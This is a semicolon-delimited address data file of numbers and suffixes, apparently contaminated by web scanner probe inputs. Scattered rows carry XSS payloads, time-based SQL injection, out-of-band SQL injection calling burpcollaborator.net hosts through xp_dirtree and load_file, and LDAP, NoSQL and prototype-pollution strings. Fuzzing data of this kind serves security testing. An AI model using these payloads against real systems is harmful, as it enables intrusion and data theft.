Number;Suffix;
1;NULL;
39;NULL;
17;NULL;
19;NULL;
3;NULL;
11;;
80;NULL;
2;A;
938;1'000,00;
14;;
71;NULL;
25;;
12;;
425;;
5;a;
938;;
150;NULL;
212;NULL;
71;NULL;
71;NULL;
10;;
938;;
1;NULL;
19;NULL;
26;A;
47;;
80;NULL;
39;NULL;
34;a;
3;NULL;
45;NULL;
2;;
1;NULL;
17;;
24;NULL;
938;;
938;;
sf2yk#{500*599}yjbea;;
19;NULL;
7;A;
26;A;
96;;
39;NULL;
4;NULL;
71;NULL;
938;;
35;;
75;"
938	
8	NULL
938	
938	
1	NULL
262	
11	
9	NULL
26	A
2	NULL
1403	
31	
938	--%3e%3cscript%3ealert(123)%3c%2fscript%3e
75	
4	NULL
3	B
107	A
70	19
247	NULL
1	
28	a
80	NULL
39	NULL
75	'+(select load_file('\\\\8enio4s6wxr4itngdjwrpt48xz3trkfbizam2ar.burpcollaborator.net\\kea'))+'
938	
25	NULL
9	
10	
938	
938	
1	NULL
10	
80	NULL
17	NULL
8	NULL
19	NULL
501	NULL
75	
71	NULL
9	NULL
938	
1	
71	NULL
27	
71	NULL
2	
75	
39	NULL
938	
71	NULL
938	%22%20onfocus%3dJaVaSCript%3aalert(123)%20autofocus
938	
39	NULL
938	
22	a
938	%3cscript%20src%3d%22%5c%5c%(jscript)s%22%3e%3c%2fscript%3e
39	NULL
17	NULL
9	NULL
13	
71	NULL
4	NULL
43	NULL
1	
938	
938	-1
938	
938	
10	
31	
938	%7b%22Length%22%3a999999999999%7d
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=	
938	
26	A
22	NULL
938	
938	
71	NULL
938	𝑻𝒉𝒆%20𝒒𝒖𝒊𝒄𝒌%20𝒃𝒓𝒐𝒘𝒏%20𝒇𝒐𝒙%20𝒋𝒖𝒎𝒑𝒔%20𝒐𝒗𝒆𝒓%20𝒕𝒉𝒆%20𝒍𝒂𝒛𝒚%20𝒅𝒐𝒈
17	NULL
100	
71	NULL
3	NULL
938	
13	NULL
83	NULL
938	
938	[%22%5cx00%22]
13	NULL
9	NULL
3	NULL
2	NULL
75	
501	NULL
80	NULL
1	NULL
938	
39	NULL
17	NULL
19	NULL
75	
1	NULL
40	
75	
17	NULL
17	
10	
1	NULL
938	%7b%220%22%3a%22%5cx00%22%7d
938	%22%60'%3e%3cscript%3e%5cxE2%5cx80%5cx82javascript%3aalert(1)%3c%2fscript%3e
938	ヽ༼ຈل͜ຈ༽ﾉ%20ヽ༼ຈل͜ຈ༽ﾉ
1	NULL
39	NULL
75	
24	NULL
7	b
25	
4	NULL
17	NULL
7	A
68	NULL
1	NULL
1	NULL
75	
71	NULL
20	NULL
938	
19	NULL
938	%7b%22_uid%22%3a1%7d
5	NULL
40	
80	NULL
83	NULL
91	
25	NULL
12	NULL
39	
938	
10	
20	NULL
68	NULL
4	NULL
938	
75	
19	NULL
938	%7b%22__constructor%22%3a%22null%22%7d
938	
65	NULL
11	
236	
6	
41	NULL
13	
25	NULL
938	
68	NULL
2	NULL
938	
75	
33	
938	
37	
938	
123	D
938	
938	
10	
938	#
10	
1	NULL
21	
75}}tsb7l'/<vrtda";
38;;
938;;
4;NULL;
938;;
34;a;
75;;
2;NULL;
45;NULL;
938;#;Changing%20length%20when%20lowercased
2;NULL;
938;;
34;a;
938;#%20U%2b0000,%20U%2b000A,%20or%20U%2b000D%20(NUL,%20LF,%20CR)%2e;
9;NULL;
938;;
19;NULL;
938;;
1;NULL;
938;%60%22'%3e%3cimg%20src%3dxxx%3ax%20%5cx0Bonerror%3djavascript%3aalert(1)%3e;
15;NULL;
1;NULL;
938;;
938;;
938;;
3;NULL;
25;NULL;
12;;
938;;
188;;
938;;
1;NULL;
11;;
938;;
3;NULL;
247;NULL;
9;NULL;
938;;
3;NULL;
42;;
938;1%2f2;
39;NULL;
938;;
88;A;
938;;
7;;
4;NULL;
7;A;
5;;
938;;
75;"');declare @q varchar(99);set @q='\\pd6znlrnveqlhamxc0v8oa3pwg2aq1es7gz3rrg.burpcollab'+'orator.net\yov'; exec master.dbo.xp_dirtree @q;-- ";
23;;
938;;
1;D;
26;A;
8;NULL;
923;;
938;;
150;NULL;
88;A;
5;NULL;
22;;
9;NULL;
938;‫test‫;
25;NULL;
68;NULL;
102;;
39;NULL;
938;;
39;NULL;
71;NULL;
247;NULL;
4;NULL;
26;A;
938;%60%22'%3e%3cimg%20src%3dxxx%3ax%20%5cx22onerror%3djavascript%3aalert(1)%3e;
3;NULL;
938;#%20The%20next%20line%20may%20appear%20to%20be%20blank%20or%20mojibake%20in%20some%20viewers%2e;
5;NULL;
34;a;
3;NULL;
17;NULL;
25;NULL;
83;NULL;
14;;
1;;
17;;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
938;部落格;
938;;
938;;
71;NULL;
15;1;
75;pc52m;
281392;;
68;NULL;
20;NULL;
938;;
938;;
938;[%221%22,%222%22];
8;NULL;
938;パーティーへ行かないか;
%3e%3cscript%3ealert(123)%3b%3c%2fscript%20x%3d;;
938;;
107;A;
938;;
938;;
111;;
938;;
45;NULL;
25;;
938;;
938;;
75;;
107;A;
938;;
80;NULL;
2;NULL;
938;;
43;NULL;
938;ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx8Bexpression(javascript%3aalert(1)%22%3eDEF;
26;A;
938;;
75;;
75;;
45;D;
75;;
45;NULL;
938;;
71;NULL;
75;;
938;1#QNAN;
938;RomansInSussex%2eco%2euk;
17;NULL;
938;;
20;;
938;;
75;;
75;' and (select*from(select(sleep(20)))a)-- ;
26;A;
24;NULL;
18;;
1;NULL;
79;A2;
4;NULL;
75;;
19;NULL;
68;NULL;
80;NULL;
75;',0)waitfor delay'0:0:20'--;
2;;
938;;
24;NULL;
9;NULL;
7;A;
1;NULL;
5;NULL;
938;;
81;;
247;NULL;
2;NULL;
19;;
24;NULL;
38;;
75;;
645;;
366;;
8;NULL;
26;A;
12;NULL;
75;;
22;;
10;;
12;NULL;
200;;
4;;
68;;
3;NULL;
938;%5c%22%3balert('XSS')%3b%2f%2f;
75;;
140;C;
75;;
75;"2pcnkm0thp&#65;n1nqxgfw9s";
4;NULL;
938;;
3;NULL;
251;NULL;
4;NULL;
34;a;
247;NULL;
65;NULL;
68;;
00mx4baxfn)(!(objectClass=*);;
4;NULL;
3;NULL;
1;NULL;
2;;
26;A;
45;NULL;
938;%3cscript%5cx0Dtype%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e;
22;B;
1;NULL;
938;;
3;NULL;
71;NULL;
12;NULL;
41;NULL;
1;NULL;
247;NULL;
68;;
51;;
2;;
75;;
39;NULL;
75;;
19;NULL;
3;;
501;;
25;NULL;
5;;
20;NULL;
12;;
17;NULL;
1;NULL;
24;NULL;
938;;
938;;
4;;
4;NULL;
18;;
75;;
150;NULL;
938;;
75;;
39;;
938;;
8;NULL;
938;;
8;NULL;
68;NULL;
6n1wvtvdhk\\l1phd5rous;;
39;NULL;
938;;
938;;
39;NULL;
68;NULL;
2;NULL;
938;;
7;;
71;NULL;
71;NULL;
8;;
3;NULL;
116;;
938;%7b%22$or%22%3a%221%3d%3d1%22%7d;
2;;
938;;
938;%2b0;
938;%3ca%20href%3d%22%5cx0Bjavascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
5;NULL;
*)(objectClass=*;;
9;NULL;
11;;
938;;
938;%3cIMG%20SRC%3d%26#x6A%26#x61%26#x76%26#x61%26#x73%26#x63%26#x72%26#x69%26#x70%26#x74%26#x3A%26#x61%26#x6C%26#x65%26#x72%26#x74%26#x28%26#x27%26#x58%26#x53%26#x53%26#x27%26#x29%3e;
17;;
3;NULL;
938;;
938;;
17;NULL;
124;;
75+(select*from(select(sleep(20)))a)+;;
116;;
12;;
938;%7b%22kind%22%3a%22null%22,%22A%22%3a%22B%22%7d;
75;;
17;NULL;
938;;
938;;
51;;
25;NULL;
938;;
938;;
71;NULL;
1;;
24;NULL;
39;NULL;
58;;
430;NULL;
83;NULL;
938;[%7b%221%22%3a%220%22%7d];
75;qihzb8wv02)(!(objectClass=*);
938;;
17;NULL;
39;NULL;
39;NULL;
24;NULL;
39;NULL;
1;NULL;
938;%3cimg%20%5cx39src%3dx%20onerror%3d%22javascript%3aalert(1)%22%3e;
71;NULL;
938;;
938;;
38;de Heun 38;
938;⁦test⁧;
938;;
1;NULL;
75;;
9;NULL;
938;;
1;NULL;
1;NULL;
938;;
75;;
938;;
9;NULL;
71;NULL;
17;NULL;
25;NULL;
3;NULL;
13;NULL;
39;NULL;
501;NULL;
938;;
938;;
938;;
68;NULL;
34;a;
17;NULL;
45;NULL;
938;%3cSCRIPT%2fXSS%20SRC%3d%22http%3a%2f%2fha%2eckers%2eorg%2fxss%2ejs%22%3e%3c%2fSCRIPT%3e;
938;;
39;NULL;
